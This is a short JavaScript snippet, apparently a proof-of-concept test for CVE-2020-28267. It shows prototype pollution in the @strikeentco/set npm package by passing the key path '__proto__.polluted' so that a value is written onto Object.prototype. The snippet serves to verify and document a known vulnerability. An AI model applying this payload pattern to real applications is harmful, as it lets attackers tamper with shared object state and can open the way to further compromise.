// //https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28267
// test("prototype pollution in strikeentco/set ", () => {
  const sset = require("@strikeentco/set");
  var obj = {};

console.log({}.polluted);

  sset(obj, "__proto__.polluted", "yes");
console.log("{ " + obj.polluted + ", " + "yes" + " }");
// });
